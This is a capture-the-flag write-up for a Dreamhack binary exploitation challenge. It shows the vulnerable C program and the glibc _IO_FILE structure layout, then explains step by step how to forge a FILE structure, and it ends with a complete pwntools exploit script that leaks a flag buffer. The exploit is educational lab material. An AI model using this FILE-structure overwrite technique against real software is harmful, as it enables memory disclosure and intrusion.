# Write-up of the challenge "\_IO_FILE Arbitrary Address Read"

This challenge is part of the "Binary exploitation" category and is in **Level 3**.

# Goal of the challenge

The objective of this challenge is to abuse the **\_IO_FILE arbitary read** vulnerability.

## Program structure

```c
// Name: iofile_aar
// gcc -o iofile_aar iofile_aar.c -no-pie

#include <stdio.h>
#include <unistd.h>
#include <string.h>

char flag_buf[1024];
FILE *fp;

void init()
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int read_flag()
{
  FILE *fp;
  fp = fopen("/home/iofile_aar/flag", "r");
  fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);
  fclose(fp);
}

int main()
{
  const char *data = "TEST FILE!";

  init();
  read_flag();

  fp = fopen("/tmp/testfile", "w");

  printf("Data: ");

  read(0, fp, 300);

  fwrite(data, sizeof(char), sizeof(flag_buf), fp);
  fclose(fp);
}


```

## Security breach

The vulnerability here is:

- **read(0, fp, 300);**, reading directly from the file descriptor instead of a buffer!

## Solution

Since we can clearly see that the goal here is **\_IO_FILE Arbitrary Address Read exploit**, we need first to copy the structure of <a href="https://gist.github.com/H4niz/8be725f85f4724f788070595b3ea54fb">**\_IO_FILE**</a>:

```c
struct _IO_FILE {

struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

};

```

So our goal is to read the **flag_buf** from the **fd**, however how do we do that? Well first we will start with the basics we need to put the flag right and for that we will choose the most common **appending mode**:

```python
payload = p64(0xfbad0000 | 0x800)
```

After that we will set the **\_IO_read_ptr** to zero because it really does not matter for the exploit we want to write out the flag buffer!

```python
payload += p64(0)
```

There is a certain rule that's good to memorize always when trying to write out a buffer using **fd** always put the **\_IO_read_end** buffer the same as the one you're writing to so that you pass the **lseek**.

```python
payload += p64(flag_buf)
```

Later we will set the **\_IO_read_base** to 0 because all we need is to write out the **flag buffer** and we already fooled the **lseek** so no need to focus on the read anymore!

```python
payload += p64(0)
```

Now we will set the start of our writing which is at the **flag buffer**

```python
payload += p64(flag_buf)
```

We will also specify the end of our writing and it will be **300 bytes** away from the **flag buffer**

```python
payload += p64(flag_buf + 300)
```

Now all the other values does not interset us expect the **\_fileno** because we need to set it to **1** to make the program print out the buffer in our console and the offset from the **\_fileno** and **\_IO_write_end** is 8 elements so therefore we will send 0 zeros!

```python
payload += p64(0) * 8
```

Now we finally reached the **\_fileno** and we will set 1 to write it out!

```python
payload += p64(1)
```

solve.py:

```python
from pwn import *

p = remote("host3.dreamhack.games", 23996)

e = ELF("iofile_aar")


flag_buf = e.sym['flag_buf']

payload = p64(0xfbad0000 | 0x800)
payload += p64(0)
payload += p64(flag_buf)
payload += p64(0)
payload += p64(flag_buf)
payload += p64(flag_buf + 300)
payload += p64(0) * 8
payload += p64(1)

p.sendlineafter(b"Data: ", payload)
p.interactive()

```
